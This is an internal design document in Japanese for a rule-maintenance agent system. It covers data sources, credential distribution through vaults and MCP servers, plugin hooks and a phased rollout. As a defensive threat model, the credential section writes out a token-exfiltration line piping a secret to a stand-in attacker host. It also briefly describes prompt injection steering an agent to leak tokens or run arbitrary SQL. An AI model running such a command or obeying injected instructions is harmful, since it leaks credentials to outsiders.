# データ収集と配布

ルール作成・改善ループに必要なデータを、どこから・どう取るか。プラグインや認証情報をどう配るか。

> 関連: 全体フローは [`workflow.md`](./workflow.md)、データの中身は [`rule-model.md`](./rule-model.md)、Managed Agent + 外部 trigger の実現性は [`managed-agent-capabilities.md`](./managed-agent-capabilities.md)。

## 1. データ収集の方針

### 1.1 何が必要か / どこから取れるか

| 必要データ | 取得元 |
|---|---|
| PR 内容 / レビューコメント | GitHub API |
| Databricks プロンプト（OTel） | Databricks `dev_bronze.s3_otel_logs.*` |
| 評価シート (JSONL) | git（PR に commit 済み） |
| repo / branch / PR 番号 | GitHub（PR から自動取得） |
| **rule 本体 / embedding / evidence / state** | **Databricks `dev_bronze.test.harness_*`**（rule-model.md §5） |
| スキル使用パターン | 必要なら OTel / hook（任意） |
| Hook 発火結果 | 必要なら OTel / hook（任意） |

PR に至った作業に関する情報は **基本的に GitHub + git だけで揃う**。rule のライフサイクル管理（candidates / lessons / evidence / processed PR）は Databricks に閉じ込めることで、実装エージェントが repo を grep / glob で探索したときに余計な情報を読み込まないようにする。

### 1.2 採用する基本方針

**PR 同梱方式**:

- 評価シート JSONL を PR の commit に含める
- ルール作成 Managed Agent は GitHub MCP server で PR / コメント / 評価シートを読む
- ローカルから Databricks への **直接 POST** 経路は当面持たない（MCP / connector 経由の CRUD は Phase 1 で導入、§5 参照）

理由:

- インフラ不要、認証配布不要
- 必要な情報は PR に集約される
- PR レビュー時に評価シートが目で見える
- まず最小構成で始めて、必要が顕在化した時に追加で取得する判断ができる

### 1.3 PR にならないセッションについて

PR を作らずに終わったセッション（試行錯誤・abandon 等）は **記録に残らない**。
これは許容する: ルール作成の素材は実際の PR データなので、PR に至らなかったものは対象外。

## 2. 取得方法の選択肢（参考）

PR 同梱方式で足りなくなったとき用に、選択肢を整理しておく。

### 2.1 OpenTelemetry テレメトリ

Claude Code に組み込まれている自動送信機能。

- env var で有効化（`CLAUDE_CODE_ENABLE_TELEMETRY=1` 等）
- セッション / ユーザ / workspace パス / tool 実行 / skill 発火 / hook 結果 等を自動収集
- 送信先（OTel Collector）は自社で立てる
- Anthropic にデータは行かない（指定したエンドポイントへ直送）

**取れるもの**: Claude Code 内部のイベントは網羅的。
**取れないもの**: repo URL / branch / PR 番号などの「外の世界の情報」は直接出ない。

### 2.2 Hook script から POST（参考 / 本番主経路ではない）

プラグインに同梱する hook script から、任意のエンドポイントへ HTTP POST。

- SessionStart / PreToolUse / Stop 等のタイミングで発火
- スクリプト内で `git remote get-url origin` / `gh pr view` などを叩いて context を取得
- token を使って Databricks REST API に直接 POST も可能

**取れるもの**: 自由設計。git 情報 / 任意の外部システムとの紐付け等を載せられる。
**取れないもの**: Hook を仕掛けた箇所だけ。

**Managed Agent 方針での扱い**: 本番の rule maintenance では採用しない。
hook は評価シート検証など実装 repo 内の guard に限定し、Databricks への書き込みは Managed Agent + MCP server 経由に寄せる。

### 2.3 セッショントランスクリプト丸ごと

Claude Code は `~/.claude/projects/<...>/<session-id>.jsonl` にセッション全体を保存している。Stop hook で PR に同梱 or POST すれば、個別 hook を仕掛けずに全部入る。

**注意**: 機密データ（prompt / Bash full_command 等）が含まれる。redact 必須。

## 3. 認証情報の配布

Managed Agent 方針では、rule maintenance 用 credential は Claude cloud console の connector / MCP server 側に閉じ込める。
ローカル hook や agent env に token を配らない。

### 3.1 個人検証フェーズ

各自が自分の **Databricks Personal Access Token (PAT)** を発行して、env var に設定。

- Databricks UI → User Settings → Developer → Access Tokens → 発行
- `DATABRICKS_HOST` / `DATABRICKS_TOKEN` を env に
- 自分のスキーマ（例: `users.<name>.harness_test`）に書き込みテストするだけならこれで十分

**用途**: 動作検証のみ。本番には向かない。

### 3.2 本番運用: Managed Agent + MCP server + Vault

Managed Agent（`platform.claude.com/v1/agents`）から Databricks / GitHub にアクセスする credential は、Anthropic の **vault** に格納する。agent の `mcp_servers` 配列で MCP server URL を declare し、session 起動時に `vault_ids` で対応する vault を attach すると、Anthropic 側で credential を MCP server に注入する（agent コンテナには見えない）。
Server-managed Settings は実装エージェント用 plugin / hook 配布には使えるが、Managed Agent の secret 配布面にはしない。

Claude.ai の admin console から配布する Server-managed Settings は、あくまで非機密設定と plugin 有効化に限定する。

| 項目 | 内容 |
|---|---|
| 配置 | Claude.ai admin console → Admin Settings → Claude Code → Managed settings |
| 配布経路 | ユーザがログインすると自動 sync（起動時 + 1 時間毎に poll） |
| 要件 | Claude.ai Team / Enterprise プラン、Claude Code v2.1.38 以降（Team の場合） |
| MDM | **不要**（Anthropic サーバ経由で JSON 設定が配布される）。ただし MDM 不要なのは「**JSON 設定本体の配布**」だけで、後述する **mTLS クライアント証明書のような秘密素材は別経路（MDM / 1Password / OS keychain 等）が必要** |
| ユーザによる上書き | 不可（最高優先度） |

設定例:

```json
{
  "env": {
    "HARNESS_ZEROBUS_ENDPOINT": "https://<workspace>.zerobus.<region>.cloud.databricks.com",
    "HARNESS_TARGET_TABLE": "dev_bronze.test.harness_session_context"
  },
  "enabledPlugins": ["my-rule-plugin"]
}
```

**重要**: `DATABRICKS_TOKEN` のような実 token は env で直接配布しない。理由:

- Claude Code の bash 自由実行 + 任意 OSS コード読み込みで token exfil 経路ができる
- `echo $TOKEN | curl evil.com` 系の prompt injection が成立する

Managed Agent の DB 接続は以下を採用:

| 案 | 仕組み | 採用フェーズ |
|---|---|---|
| **B. MCP server + SP credential を vault に格納**（Phase 1 推奨） | Databricks SQL MCP server を Managed Agent の `mcp_servers` に declare し、**narrow-scope Service Principal の M2M credential** を Anthropic vault に格納。session 起動時に `vault_ids` で attach すると Anthropic 側で MCP server に credential 注入。agent コンテナから credential は見えない。SP 権限: (a) `dev_bronze.s3_otel_logs.*` の SELECT、(b) `dev_bronze.test.harness_*` の SELECT/INSERT/UPDATE（rules / rule_embeddings / rule_evidence / processed_prs / review_outcomes / run_metrics）、(c) `harness_session_context` の SELECT/INSERT。MCP server から agent への outgoing response は secret filter 相当の処理を通す（5xx body 等への token 混入対策） | Phase 1 〜 |
| A. 短命 token を hook 内で fetch | hook script が起動時に社内の token broker（mTLS 認証付き）から短命 token を取得し、メモリ上で curl POST、env には載せない。**mTLS クライアント証明書の各 PC への配布**には MDM か 1Password の SSO 連携、または OS keychain への手動セットアップが必要 | Phase 4（MDM / cert 配布基盤が整った後） |

**Phase 1 では Option B のみを採用**。Option A は mTLS 証明書配布のインフラが整っていない現状では「MDM 不要」と両立しないため、Phase 4 まで延期する。

**Option B 設計上の重要事項**:

- **OAuth SSO（U2M flow）と narrow-scope SP は本質的に両立しない**。SSO はユーザ個人の権限で動くため、admin 権限を持つユーザの prompt injection 経路では任意 SQL が走る。Phase 1 では SSO ではなく **M2M client credentials flow** で SP token を取得する
- SP credential は **connector / MCP server 側**のみが保持する。repo / agent env / hook script には置かない
- MCP server に **SQL allow-list** を実装（実行可能なテーブル / 操作の whitelist）。任意 SELECT / INSERT / DROP を agent が要求しても MCP server 層で拒否。**allow-list の owner は security-team**、agent からは見えない / 編集不能（Unity Catalog の table-level grant でも二重に制約）
- MCP server の outgoing response は §10.5 同等の **secret filter** に通してから agent に返す（5xx body 等への token 混入対策）

**Option B-2（fallback）: MCP server が M2M を受け付けない場合**:

公式 / OSS の Databricks SQL MCP server が `DATABRICKS_CLIENT_ID` / `DATABRICKS_CLIENT_SECRET` を直接受けない実装の場合（実装によっては PAT のみサポート）:

1. **PAT 経由 fallback**: SP の **Personal Access Token** を Databricks admin が手動発行し、connector / MCP server の secret として設定。rotation は 90 日 cadence で security-team が手動更新
2. **Wrapper 経由 fallback**: `databricks-sdk-py` を MCP server プロセス内で wrap し、M2M flow で取得した token を SDK 内に閉じ込めて MCP API に変換するアダプタ層を自前実装
3. いずれの fallback でも、SP の権限スコープ（`dev_bronze.s3_otel_logs.*` SELECT のみ等）は変えない

**Rotation 手順**:

- SP credential / PAT ともに **90 日 rotation**、security-team が vault credential を update
- rotation 後は canary（§10.5）が新 credential で `SELECT 1` を叩いて疎通確認、失敗時 alert
- 緊急 revoke は Databricks admin が SP を disable、Anthropic 側は vault credential を archive、外部 trigger 側は `HARNESS_KILL_SWITCH=1` を Databricks secret / GitHub Actions secret に立てて停止

env に乗せる情報は **endpoint URL とテーブル名等の非機密情報のみ**にする。**配るトークン自体は権限を最小化した Service Principal にし**（特定テーブルへの INSERT のみ）、漏洩時の被害を局所化する。SP credential 本体は Anthropic vault で管理し、Databricks Workflow / GitHub Actions の Secret には Anthropic API key と endpoint URL のみを置く。

### 3.3 credential 管理方法の比較

| | 個人 PAT | Claude connector / MCP secret |
|---|---|---|
| セキュリティ | 個人の権限分のみ | narrow-scope SP なら limited、agent env から見えない |
| 配布の手間 | 各自セットアップ | admin / security-team が connector 側で設定 |
| 退職 / ローテーション | 個人で管理 | connector / SP credential を中央管理 |
| 本番向き? | ❌ | ✅ |

## 4. プラグインの最小構成

```
my-rule-plugin/
├── .claude-plugin/
│   └── plugin.json
└── hooks/
    ├── hooks.json
    └── pre-push-guard.sh
```

### 4.1 同梱するもの

- **PreToolUse hook**: push 検出時に評価シートを検証、不備があれば deny（[`rule-model.md`](./rule-model.md) §6 強制）
- **必要なら SessionStart hook**: repo / branch / PR 番号などを Databricks にメタデータとして送る（採用するなら）

### 4.2 配布方法

- 検証フェーズ: `claude --plugin-dir ./my-rule-plugin` でローカル動作確認
- 試験運用: 社内プラグインマーケットプレイス（Enterprise）または GitHub プライベートリポジトリで配布
- 本番: Server-managed settings の `enabledPlugins` で強制有効化

## 5. 段階的な進め方

| Phase | やること |
|---|---|
| **Phase 1A** | Databricks table 作成 + test data seed。最小 fixture で SELECT / INSERT / UPDATE を確認 |
| **Phase 1B** | `rule-creation-agent` / `rule-review-agent` を Anthropic Managed Agents API で作成し、fixture から candidate を抽出できることを確認 |
| **Phase 1C** | Databricks Workflow を schedule trigger で動かす + Anthropic vault に MCP credential 登録。出力は GitHub Issue |
| **Phase 2** | OTel ingest Job dependency に切り替え（B3）、multiagent coordinator 化、harness-pr-cleanup の GitHub Actions workflow を有効化 |
| **Phase 3** | Issue-first の品質確認後、SKILL.md 再生成（Databricks Workflow daily schedule）/ draft PR を有効化 |
| **Phase 4** | チーム数人で試験運用、必要であれば Option A（token broker + mTLS）を MDM 整備とセットで導入 |

Phase 1 から Anthropic Managed Agents の Agent / Vault 設定と Databricks Workflow 設定が必要になるため、完全な個人ローカル完結ではない。
ただし rule 抽出の主処理は Databricks Workflow / GitHub Actions の外部 trigger 層ではなく、Managed Agent session 内で完結させる。

## 6. 未確定事項

ここは運用してから決める:

- 個別の hook POST を入れるか、PR 同梱だけで通すか
- OTel テレメトリを併用するか
- Databricks connector / MCP server の認証方式（SP M2M / OAuth / PAT fallback）
- セッショントランスクリプトを Issue / Databricks にどう紐付けるか（機密データ管理の整理が必要）
